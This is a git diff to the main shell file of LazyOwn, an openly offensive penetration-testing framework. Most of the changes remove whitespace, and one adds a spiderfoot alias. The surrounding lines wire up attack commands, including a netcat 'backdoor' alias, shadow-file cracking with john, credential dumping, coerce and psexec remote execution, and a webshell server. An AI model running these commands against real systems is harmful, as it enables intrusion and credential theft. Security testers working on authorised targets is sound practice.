@@ -44,36 +44,36 @@ with open('payload.json', 'r') as file:
     url_trafic_1 = config.get("url_trafic_1")
     url_trafic_2 = config.get("url_trafic_2")
     url_trafic_3 = config.get("url_trafic_3")
-    
+
 class LazyOwnShell(cmd2.Cmd):
     """
     A custom interactive shell for the LazyOwn Framework.
 
-    This class extends the Cmd class to provide an interactive command-line 
-    interface for the LazyOwn Framework. It supports various commands and 
-    modules related to security and network operations. The shell is initialized 
-    with a set of parameters and scripts, allowing users to execute predefined 
+    This class extends the Cmd class to provide an interactive command-line
+    interface for the LazyOwn Framework. It supports various commands and
+    modules related to security and network operations. The shell is initialized
+    with a set of parameters and scripts, allowing users to execute predefined
     functions and manage tasks within the framework.
 
     Attributes:
-        prompt (str): The command prompt for the shell, obtained from the 
+        prompt (str): The command prompt for the shell, obtained from the
                       `getprompt()` function.
-        intro (str): A welcome message and disclaimer displayed when the shell 
+        intro (str): A welcome message and disclaimer displayed when the shell
                      starts, with information about the framework and its usage.
-        aliases (dict): A dictionary of command aliases for easier access to 
+        aliases (dict): A dictionary of command aliases for easier access to
                         frequently used commands.
-        params (dict): A dictionary of parameters with their default values, 
+        params (dict): A dictionary of parameters with their default values,
                        used for configuring various aspects of the framework.
-        scripts (list): A list of script names included in the toolkit, representing 
+        scripts (list): A list of script names included in the toolkit, representing
                         the available modules and functionalities.
-        output (str): An empty string for storing output or results from executed 
+        output (str): An empty string for storing output or results from executed
                       commands or scripts.
-        custom_prompt (str): A custom prompt for the shell, obtained from the 
+        custom_prompt (str): A custom prompt for the shell, obtained from the
                              `getprompt()` function.
 
     Methods:
-        __init__(): Initializes the shell with default parameters, script names, 
-                    and an empty output string. Sets up the command prompt and 
+        __init__(): Initializes the shell with default parameters, script names,
+                    and an empty output string. Sets up the command prompt and
                     custom prompt.
     """
 
@@ -82,10 +82,10 @@ class LazyOwnShell(cmd2.Cmd):
     if NOBANNER:
         intro = ""
     else:
-        intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BRIGHT_BLUE}{version} 
+        intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BRIGHT_BLUE}{version}
     {WHITE}[*] interactive s{BRIGHT_RED}H{WHITE}ell! Type ? to list commands{BLUE}
-    {RED}[!] Please do not use in military or secret service organizations, 
-    {RED}[!] or for illegal purposes (this is non-binding, 
+    {RED}[!] Please do not use in military or secret service organizations,
+    {RED}[!] or for illegal purposes (this is non-binding,
     {RED}[!] these *** ignore laws and ethics anyway){BLUE}
     {GREEN}[+] Github: {BRIGHT_BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn{RESET}
     {GREEN}[+] Web: {BRIGHT_BLUE}{UNDERLINE}https://grisuno.github.io/LazyOwn/{RESET}
@@ -105,7 +105,7 @@ class LazyOwnShell(cmd2.Cmd):
     lport = config.lport
     c2_port = config.c2_port
 
-    
+
     aliases = {
         "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
         "available_filter_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions",
@@ -120,7 +120,7 @@ class LazyOwnShell(cmd2.Cmd):
         "backdoor": f"sh rlwrap --always-readline nc {rhost} 31337",
         "caja": "sh caja sessions",
         "chown": "sh sudo -s chown 1000:1000 . -R",
-        "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control", 
+        "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control",
         "coerce_plus": f"sh netexec smb {rhost} -u {start_user} -p '{start_pass}' -d {domain} -M coerce_plus -o LISTENER={lhost}",
         "creds": "sh cat sessions/credentials*",
         "cloudflare_tunnel": f"sh bash modules/mkcloudflaretunnel.sh {c2_port}",
@@ -204,8 +204,9 @@ class LazyOwnShell(cmd2.Cmd):
         "stop_tor": "sh sudo systemctl stop tor",
         "stop_apt": "sh sudo systemctl stop apt-cacher-ng",
         "start_apt": "sh sudo systemctl start apt-cacher-ng",
+        "spiderfoot":"spiderfoot -l 127.0.0.1:2222",
         "update": "sh git pull origin main",
-        "unshadow": "sh sudo unshadow sessions/passwd sessions/shadow > sessions/hash.txt && sudo john sessions/hash.txt -w /usr/share/wordlists/rockyou.txt", 
+        "unshadow": "sh sudo unshadow sessions/passwd sessions/shadow > sessions/hash.txt && sudo john sessions/hash.txt -w /usr/share/wordlists/rockyou.txt",
         "venom": "run lazymsfvenom",
         "vmallocinfo": "sh sudo cat /proc/vmallocinfo",
         "vuln": 'sh echo "    \033[33m[!] Searchspoit\n    \033[34m[!] The Exploit of the Day (you can use the command: cp path/of/exploit to copy exploit to working sessions directory):\033[32m" ;     searchsploit --cve | shuf -n 1 ',
@@ -247,7 +248,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.lua.globals().list_files_in_directory = self.list_files_in_directory
         self.load_plugins()
         self.register_tool_commands()
-        self.completekey = 'tab' 
+        self.completekey = 'tab'
         self.register_all_adversary_commands()
         self.output = ""
         self.custom_prompt = getprompt()
@@ -258,7 +259,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.url_download = url_download
         self.version = version
         self.sessions_dir = f"{self.path}/sessions"
-        self.captured_images_dir = os.path.join(self.sessions_dir, 'captured_images')        
+        self.captured_images_dir = os.path.join(self.sessions_dir, 'captured_images')
         self.console = Console()
         self.params = {
             "binary_name": "gzip",
@@ -356,7 +357,7 @@ class LazyOwnShell(cmd2.Cmd):
             "lazywerkzeugdebug",
         ]
 
-        
+
     def log_command(self, cmd_name, cmd_args):
         """
         Logs the command execution details to a CSV file.
@@ -365,8 +366,8 @@ class LazyOwnShell(cmd2.Cmd):
         :param cmd_args: The arguments of the command.
         """
         start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        end_time = start_time  
-        
+        end_time = start_time
+
         log_data = {
             "start": start_time,
             "end": end_time,
@@ -411,14 +412,14 @@ class LazyOwnShell(cmd2.Cmd):
         cmd_name = parts[0].strip()
         cmd_args = parts[1] if len(parts) > 1 else ""
         method_name = f"do_{cmd_name}"
-       
+
         method = getattr(self, method_name, None)
         self.onecmd("rrhost")
         if callable(method):
             return method(cmd_args)
         else:
             self.display_toastr(f"Not Found {line}", type="warning")
-            
+
     def logcsv(self, line):
         command = line
         parts = command.split(maxsplit=1)
@@ -450,14 +451,14 @@ class LazyOwnShell(cmd2.Cmd):
         if NOLOGS:
             os.system(f" {command}")
         else:
-            path_command = f"{path}/sessions/logs/command_{cmd_name}output{domain}.txt" 
+            path_command = f"{path}/sessions/logs/command_{cmd_name}output{domain}.txt"
             os.system(f" {command} | tee {path_command}")
             if os.path.exists(path_command):
                 with open(path_command, "r") as file:
                     self.output = f"{cmd_name} {command} {file.read()}"
         self.logcsv(f"{cmd_name} {command}")
         return
-           
+
     def one_cmd(self, command):
         """
         Internal function to execute commands.
@@ -478,7 +479,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.onecmd(command)
             self.output = sys.stdout.getvalue()
             sys.stdout = original_stdout
-            
+
             return self.output
         except Exception as e:
             self.output = str(e)
@@ -506,7 +507,7 @@ class LazyOwnShell(cmd2.Cmd):
             >>> shell = LazyOwnShell()
             >>> shell.emptyline()
             You didn't enter any command.
-        """        
+        """
         print_warn("You didn't enter any command.")
 
     def list_files_in_directory(self, directory):
@@ -546,13 +547,13 @@ class LazyOwnShell(cmd2.Cmd):
                         continue
 
                     report = NmapParser.parse_fromfile(xmmll)
-                    
 
-                    
+
+
                     for host in report.hosts:
                         for service in host.services:
                             if service.service in triggers or "all" in triggers:
-    
+
                                 cmd_params = {
                                     "ip": host.address,
                                     "port": str(service.port),
@@ -569,7 +570,7 @@ class LazyOwnShell(cmd2.Cmd):
                                         tool_name
                                     ),
                                     "tunnel": "s" if service.tunnel == "ssl" else "",
-                    
+
                                 }
 
                                 os.makedirs(cmd_params["outputdir"], exist_ok=True)
@@ -605,7 +606,7 @@ class LazyOwnShell(cmd2.Cmd):
                 self.display_toastr(f"Error en el comando Lua {command_name}: {e}", type="error")
         yaml_file = os.path.join(self.plugins_dir, f"{command_name}.yaml")
         description = ""
-        
+
         if os.path.exists(yaml_file):
             try:
                 with open(yaml_file, 'r') as file:
@@ -683,14 +684,14 @@ class LazyOwnShell(cmd2.Cmd):
         params = plugin_data.get('params', [])
         description = plugin_data.get('description', [])
         execute_command = tool.get('execute_command', '')
-      
+
         @cmd2.with_category("14. Yaml Addon.")
         def wrapper_yaml(arg):
             try:
 
                 args = arg.split()
                 param_values = {}
-                
+
                 for param in params:
                     param_name = param['name']
 
@@ -766,7 +767,7 @@ class LazyOwnShell(cmd2.Cmd):
 
     def display_toastr(self, message, type="info"):
         """Display a toastr-like notification in the terminal with adaptive sizing."""
-        
+
         styles = {
             "success": {"border_style": "green", "text_style": "bold green"},
             "error": {"border_style": "red", "text_style": "bold red"},
@@ -779,7 +780,7 @@ class LazyOwnShell(cmd2.Cmd):
         clean_message = message.strip()
         if not clean_message:
             clean_message = "Mensaje vacío"
-        
+
         lines = clean_message.split('\n')
         max_line_length = max(len(line) for line in lines)
         min_width = max(20, len(type.upper()) + 8)
@@ -796,15 +797,15 @@ class LazyOwnShell(cmd2.Cmd):
                 else:
                     wrapped = textwrap.fill(line, width=optimal_width - 8, break_long_words=False, break_on_hyphens=False)
                     wrapped_lines.extend(wrapped.split('\n'))
-            
+
             final_message = '\n'.join(wrapped_lines)
             num_lines = len(wrapped_lines)
         else:
             final_message = clean_message
             num_lines = len(lines)
-        
+
         optimal_height = num_lines + 2
-        
+
         panel = Panel(
             Text(final_message, style=style["text_style"], justify="left"),
             border_style=style["border_style"],
@@ -813,26 +814,26 @@ class LazyOwnShell(cmd2.Cmd):
             title=f"[bold]{type.upper()}[/bold]",
             title_align="center"
         )
-        
+
         def show_toastr():
             self.console.print(panel, justify="center")
-        
+
         threading.Thread(target=show_toastr, daemon=True).start()
 
     def _wrap_text(self, text, max_width):
         """Helper method to wrap text to fit within specified width."""
         import textwrap
-        
+
         lines = text.split('\n')
         wrapped_lines = []
-        
+
         for line in lines:
             if len(line) <= max_width:
                 wrapped_lines.append(line)
             else:
                 wrapped = textwrap.fill(line, width=max_width, break_long_words=True)
                 wrapped_lines.extend(wrapped.split('\n'))
-        
+
         return '\n'.join(wrapped_lines)
 
     def do_notify(self, arg):
@@ -880,7 +881,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         print_warn("LazyOwn say Goodbye!")
         return True
-    
+
     def postloop(self):
         """
         Handle operations to perform after exiting the command loop.
@@ -904,7 +905,7 @@ class LazyOwnShell(cmd2.Cmd):
             >>> shell = LazyOwnShell()
             >>> shell.cmdloop()  # Exits the command loop
             GoodBye LazyOwner
-        """        
+        """
         print_warn("GoodBye LazyOwner")
 
     @cmd2.with_category(miscellaneous_category)
@@ -933,7 +934,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error(f"Unknown parameter: {param}{RESET}")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_show(self, line):
         """
@@ -948,7 +949,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         for param, value in self.params.items():
             print_msg(f"{param}: {value}")
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_list(self, line):
         """
@@ -970,7 +971,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         max_len = max(len(script) for script in scripts)
-        column_width = max_len + 2 
+        column_width = max_len + 2
 
         rows = [
             scripts[i : i + num_columns] for i in range(0, len(scripts), num_columns)
@@ -983,8 +984,8 @@ class LazyOwnShell(cmd2.Cmd):
                     f"{script.ljust(column_width)}{RESET}    " for script in row
                 )
             )
-            
-    
+
+
     @cmd2.with_category(miscellaneous_category)
     def do_run(self, line):
         """
@@ -1009,8 +1010,8 @@ class LazyOwnShell(cmd2.Cmd):
             getattr(self, f"run_{script_name}")()
         else:
             print_error(f"Unknown script: {CYAN}{script_name}{RESET}")
-    
-    @cmd2.with_category(recon_category) 
+
+    @cmd2.with_category(recon_category)
     def run_lazysearch(self):
         """
         Runs the internal module `modules/lazysearch.py`.
@@ -1026,8 +1027,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("binary_name not set")
             return
         self.run_script("modules/lazysearch.py", binary_name)
-    
-    @cmd2.with_category(recon_category) 
+
+    @cmd2.with_category(recon_category)
     def run_lazysearch_gui(self):
         """
         Run the internal module located at `modules/LazyOwnExplorer.py`.
@@ -1056,8 +1057,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         self.run_script("modules/LazyOwnExplorer.py")
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def run_lazyown(self):
         """
         Run the internal module located at `modules/lazyown.py`.
@@ -1085,7 +1086,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         self.run_script("modules/lazyown.py")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def run_update_db(self):
         """
@@ -1115,8 +1116,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         self.cmd("./modules/update_db.sh")
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def run_lazynmap(self):
         """
         Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.
@@ -1135,8 +1136,8 @@ class LazyOwnShell(cmd2.Cmd):
             return
         self.cmd(f"{path}/modules/lazynmap.sh -t {target_ip}")
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def do_batchnmap(self, line):
         """
         Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.
@@ -1147,7 +1148,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         :return: None
         """
-        
+
         file_path = get_users_dic('txt')
         path = os.getcwd()
         try:
@@ -1161,10 +1162,10 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             self.perror(f"An error occurred: {e}")
 
-        
+
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def run_lazywerkzeugdebug(self):
         """
         Run the internal module located at `modules/lazywerkzeug.py` in debug mode.
@@ -1222,8 +1223,8 @@ class LazyOwnShell(cmd2.Cmd):
             return
         self.run_script("modules/lazywerkzeug.py", rhost, rport, lhost, lport)
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def run_lazygath(self):
         """
         Run the internal module located at `modules/lazygat.sh`. to gathering the sistem :)
@@ -1254,8 +1255,8 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         self.cmd(f"sudo {path}/modules/lazygat.sh")
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def run_lazynmapdiscovery(self):
         """
         Runs the internal module `modules/lazynmap.sh` with discovery mode.
@@ -1270,14 +1271,14 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"{path}/modules/lazynmap.sh -d")
         return
 
-    @cmd2.with_category(scanning_category) 
+    @cmd2.with_category(scanning_category)
     def do_lazynmap(self, line):
         """
         Runs the internal module `modules/lazynmap.sh` with target mode.
 
         This method executes the `lazynmap` script in target mode. It uses the current
         working directory for locating the script.
-        
+
         :param line: The network ip to be used for scanning.
         :type line: str
 
@@ -1289,7 +1290,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"{path}/modules/lazynmap.sh -t {line}")
         return
 
-    @cmd2.with_category(scanning_category) 
+    @cmd2.with_category(scanning_category)
     def run_lazysniff(self):
         """
         Run the sniffer internal module located at `modules/lazysniff.py` with the specified parameters.
@@ -1338,8 +1339,8 @@ class LazyOwnShell(cmd2.Cmd):
             stdout=sys.stdout,
             stderr=sys.stderr,
         )
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def run_lazyftpsniff(self):
         """
         Run the sniffer ftp internal module located at `modules/lazyftpsniff.py` with the specified parameters.
@@ -1384,8 +1385,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("device must be assign to choice the interface")
             return
         subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def run_lazynetbios(self):
         """
         Run the internal module to search netbios vuln victims, located at `modules/lazynetbios.py` with the specified parameters.
@@ -1435,8 +1436,8 @@ class LazyOwnShell(cmd2.Cmd):
         endip = self.params["endip"]
         spoof_ip = self.params["spoof_ip"]
         subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])
-    
-    @cmd2.with_category(recon_category) 
+
+    @cmd2.with_category(recon_category)
     def run_lazyhoneypot(self):
         """
         Run the internal module located at `modules/lazyhoneypot.py` with the specified parameters.
@@ -1502,7 +1503,7 @@ class LazyOwnShell(cmd2.Cmd):
             "--email_password",
             email_password,
         )
-    @cmd2.with_category(reporting_category) 
+    @cmd2.with_category(reporting_category)
     def do_gpt(self, line):
         """
         Run the internal module to create Oneliners with Groq AI located at `modules/lazygptcli.py` with the specified parameters.
@@ -1547,7 +1548,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         if not line:
             prompt = self.params["prompt"]
-        else: 
+        else:
             prompt = line.strip()
         api_key = self.params["api_key"]
         if not prompt or not api_key:
@@ -2693,7 +2694,7 @@ class LazyOwnShell(cmd2.Cmd):
             process.wait()
             print_error("[Interrupted] Process terminated")
 
-    @cmd2.with_category(miscellaneous_category) 
+    @cmd2.with_category(miscellaneous_category)
     def do_payload(self, line):
         """Load parameters from a specified payload JSON file.
 
@@ -2740,7 +2741,7 @@ class LazyOwnShell(cmd2.Cmd):
         except json.JSONDecodeError:
             print_error(f"Error decoding {filename}")
 
-    @cmd2.with_category(miscellaneous_category) 
+    @cmd2.with_category(miscellaneous_category)
     def do_exit(self, arg):
         """Exit the command line interface.
 
@@ -2782,7 +2783,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_warn(f"{RED}Exit canceled.{RESET}")
             return False
-    @cmd2.with_category(miscellaneous_category) 
+    @cmd2.with_category(miscellaneous_category)
     def do_fixperm(self, line):
         """Fix permissions for LazyOwn shell scripts.
 
@@ -2814,8 +2815,8 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd("chmod +x modules/*.sh")
         self.cmd("chmod +x modules/cgi-bin/*")
         return
-    
-    @cmd2.with_category(post_exploitation_category) 
+
+    @cmd2.with_category(post_exploitation_category)
     def do_lazywebshell(self, line):
         """Run LazyOwn webshell server.
 
@@ -2847,8 +2848,8 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("Running Server in localhost:8888/cgi-bin/lazywebshell.py")
         os.system("cd modules && python3 -m http.server 8888 --cgi &")
         return
-    
-    @cmd2.with_category(recon_category) 
+
+    @cmd2.with_category(recon_category)
     def do_getcap(self, line):
         """Retrieve and display file capabilities on the system.
 
@@ -2865,7 +2866,7 @@ class LazyOwnShell(cmd2.Cmd):
         Manual execution:
         1. Run the `getcap -r /` command to list file capabilities recursively from the root directory.
         2. Redirect standard error to `/dev/null` to suppress error messages.
-        3. Copy to clipboard the command to appy in the victim machine. 
+        3. Copy to clipboard the command to appy in the victim machine.
         Dependencies:
         - `getcap` must be installed on the system.
 
@@ -2881,8 +2882,8 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(command)
         copy2clip(command)
         return
-    
-    @cmd2.with_category(miscellaneous_category) 
+
+    @cmd2.with_category(miscellaneous_category)
     def do_getseclist(self, line):
         """Get the SecLists wordlist from GitHub.
 
@@ -2920,7 +2921,7 @@ class LazyOwnShell(cmd2.Cmd):
         && sudo unzip SecList.zip \
         && sudo  rm -f SecList.zip""")
 
-    @cmd2.with_category(scanning_category) 
+    @cmd2.with_category(scanning_category)
     def do_smbclient(self, line):
         """
         Interacts with SMB shares using the `smbclient` command to perform the following operations:
@@ -2962,7 +2963,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(f"Try .. smbclient \\\\{rhost}\\\\{directorio} -U {user} {RESET}")
                     self.cmd(f"smbclient \\\\\\\\{rhost}\\\\{directorio} -U {user} ")
                     return
-            
+
             print_msg(f"Perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
             self.cmd(f"smbclient -N -L \\\\{rhost}\\")
             print_msg(
@@ -2986,7 +2987,7 @@ class LazyOwnShell(cmd2.Cmd):
                     )
                     print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
-    @cmd2.with_category(scanning_category) 
+    @cmd2.with_category(scanning_category)
     def do_smbclient_impacket(self, line):
         """
         Interacts with SMB shares using the `smbclient` command to perform the following operations:
@@ -3028,7 +3029,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(f"Try .. impacket-smbclient \\\\{rhost}\\\\{directorio} -U {user} {RESET}")
                     self.cmd(f"impacket-smbclient \\\\\\\\{rhost}\\\\{directorio} -U {user} ")
                     return
-            
+
             print_msg(f"Perform this command: impacket-smbclient -N -L \\\\{rhost}\\ {RESET}")
             self.cmd(f"impacket-smbclient -N -L \\\\{rhost}\\")
             print_msg(
@@ -3052,7 +3053,7 @@ class LazyOwnShell(cmd2.Cmd):
                     )
                     print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
-    @cmd2.with_category(scanning_category) 
+    @cmd2.with_category(scanning_category)
     def do_smbclient_py(self, line):
         """
         Interacts with SMB shares using the `smbclient.py` command to perform the following operations:
@@ -3097,7 +3098,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
 
-    @cmd2.with_category(scanning_category) 
+    @cmd2.with_category(scanning_category)
     def do_smbmap(self, line):
         """smbmap -H 10.10.10.3 [OPTIONS]
         Uses the `smbmap` tool to interact with SMB shares on a remote host:
@@ -3134,7 +3135,7 @@ class LazyOwnShell(cmd2.Cmd):
                     rhost = input(f"    [!] Enter a valid host (default: {rhost}): ") or rhost
                     hashis = get_hash()
 
-                    command = f"smbmap -u {username} -d {domain} -p '{hashis}' -H {rhost}"    
+                    command = f"smbmap -u {username} -d {domain} -p '{hashis}' -H {rhost}"
                     print_msg(command)
                     self.cmd(command)
                     return
@@ -3157,7 +3158,7 @@ class LazyOwnShell(cmd2.Cmd):
                 command_try = input(f"    {GREEN}[!] Enter the command to try (default: whoami): ") or "whoami"
                 execute += command_try
             else:
-           
+
                 if_search =  input(f"    {GREEN}[?] Do you wanna try search files (y/n)") or "n"
                 if if_search == "y":
                     execute = " -A "
@@ -3201,11 +3202,11 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(
                     f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                 )
-                print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')                
+                print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                 return
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def do_getnpusers(self, line):
         """sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt
         Executes the `impacket-GetNPUsers` command to enumerate users with Kerberos pre-authentication disabled.
@@ -3222,7 +3223,7 @@ class LazyOwnShell(cmd2.Cmd):
         To manually run this command, use the following syntax:
             sudo impacket-GetNPUsers <domain> -no-pass -usersfile sessions/users.txt
         Replace `<domain>` with the actual domain name you want to query."""
-       
+
         rhost = self.params["rhost"]
         domain = self.params["domain"]
         if not line:
@@ -3249,8 +3250,8 @@ class LazyOwnShell(cmd2.Cmd):
                             #if choice == "n":
                             #    return
         return
-    
-    @cmd2.with_category(exploitation_category) 
+
+    @cmd2.with_category(exploitation_category)
     def do_psexec(self, line):
         """
         Executes the Impacket PSExec tool to attempt remote execution on the specified target.
@@ -3269,10 +3270,10 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
         None
-        """  
+        """
         rhost = self.params["rhost"]
-        
-        
+
+
         if not check_rhost(rhost):
             return
 
@@ -3306,8 +3307,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(command)
             self.cmd(command)
         return
-    
-    @cmd2.with_category(exploitation_category) 
+
+    @cmd2.with_category(exploitation_category)
     def do_psexec_py(self, line):
         """
         Executes the Impacket PSExec tool to attempt remote execution on the specified target.
@@ -3326,10 +3327,10 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
         None
-        """  
+        """
         rhost = self.params["rhost"]
-        
-        
+
+
         if not check_rhost(rhost):
             return
 
@@ -3363,8 +3364,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(command)
             self.cmd(command)
         return
-    
-    @cmd2.with_category(scanning_category) 
+
+    @cmd2.with_category(scanning_category)
     def do_rpcdump(self, line):
         """
         Executes the `rpcdump.py` script to dump RPC services from a target host.
@@ -3389,8 +3390,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Try... rpcdump.py -p 593 {rhost}{RESET}")
             self.cmd(f"rpcdump.py -p 593 {rhost}")
         return
-    
-    @cmd2.with_category(recon_category) 
+
+    @cmd2.with_category(recon_category)
     def do_dig(self, line):
         """
         Executes the `dig` command to query DNS information.
@@ -3424,7 +3425,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"dig any {line} @{rhost}")
         return
 
-    @cmd2.with_category(exploitation_category) 
+    @cmd2.with_category(exploitation_category)
     def do_cp(self, line):
         """
         Copies a file from the ExploitDB directory to the sessions directory.
@@ -3458,7 +3459,7 @@ class LazyOwnShell(cmd2.Cmd):
         os.system(f"cp {exploitdb}{line} {path}/sessions/")
         os.system(f"searchsploit {line} -p")
         return
-    
+
     @cmd2.with_category(recon_category)
     def do_dnsenum(self, line):
         """
@@ -3528,7 +3529,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"    {GREEN}[+] Try ... dnsmap {line} -w {dnswordlist} {RESET}")
         self.cmd(f"dnsmap {line} -w {dnswordlist}")
         return
-    
+
     @cmd2.with_category(recon_category)
     def do_whatweb(self, line):
         """
@@ -3554,8 +3555,8 @@ class LazyOwnShell(cmd2.Cmd):
         url = self.params["url"]
         if not check_rhost(rhost):
             return
-        
-        
+
+
         if not line:
             print_msg(f"Try... whatweb {rhost}{RESET}")
             self.cmd(f"whatweb {rhost}")
@@ -3596,7 +3597,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try... enum4linux -a {rhost} {RESET}")
         self.cmd(f"enum4linux -a {rhost}")
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_nbtscan(self, line):
         """
@@ -3671,12 +3672,12 @@ class LazyOwnShell(cmd2.Cmd):
                         self.cmd(command)
 
         else:
-            
+
             command = f"rpcclient -U {machine}/{line} {rhost}"
             print_msg(f"Try... {GREEN} {command} {RESET}")
             self.cmd(command)
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_nikto(self, line):
         """
@@ -3705,7 +3706,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("nikto"):
             print_warn("Installing nikto...")
             self.cmd("sudo apt install nikto -y")
-        
+
         options = {
             "ask": input("    [?] Enter whether to ask about submitting updates (yes, no, auto): "),
             "check6": input("    [?] Check if IPv6 is working (yes/no): "),
@@ -3781,10 +3782,10 @@ class LazyOwnShell(cmd2.Cmd):
 
         Manual execution:
         To manually perform a web server vulnerability scan using `finalrecon`, use the following command:
-            finalrecon --url=http://<target_ip> --full -o txt -cd <directory_reports> 
+            finalrecon --url=http://<target_ip> --full -o txt -cd <directory_reports>
 
         Replace `<target_ip>` with the IP address of the target web server. For example:
-            finalrecon --url=http://192.168.1.92 --full -o txt -cd /home/gris/finalrecon 
+            finalrecon --url=http://192.168.1.92 --full -o txt -cd /home/gris/finalrecon
         """
 
         if not is_binary_present("finalrecon"):
@@ -3850,7 +3851,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Searching in searchsploit{RESET}")
         self.cmd(f"searchsploit {line}")
-        
+
 
         getnvd = find_ss(line)
         nvddb(getnvd)
@@ -3864,7 +3865,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://sploitus.com/?query={line}#exploits")
         print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://exploits.shodan.io/?q={line}")
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_wfuzz(self, line):
         """
@@ -3902,7 +3903,7 @@ class LazyOwnShell(cmd2.Cmd):
         dirwordlist = self.params["dirwordlist"]
         choice = input("    [!] Enter the numer 1 to directory-list-2.3-medium.txt 2 to raft-large-words.txt [1/2] (Default 2): ") or '2'
         if choice == '2':
-            dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")        
+            dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")
         rhost = self.params["rhost"]
         url = self.params["url"]
         url = get_domain(url)
@@ -4094,7 +4095,7 @@ class LazyOwnShell(cmd2.Cmd):
         )
         self.cmd(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_addhosts(self, line):
         """
@@ -4118,7 +4119,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.onecmd("PTMultiTools")
 
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_cme(self, line):
         """
@@ -4145,12 +4146,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         Manual Execution Example:
         To manually run CrackMapExec for SMB enumeration, use:
-        
+
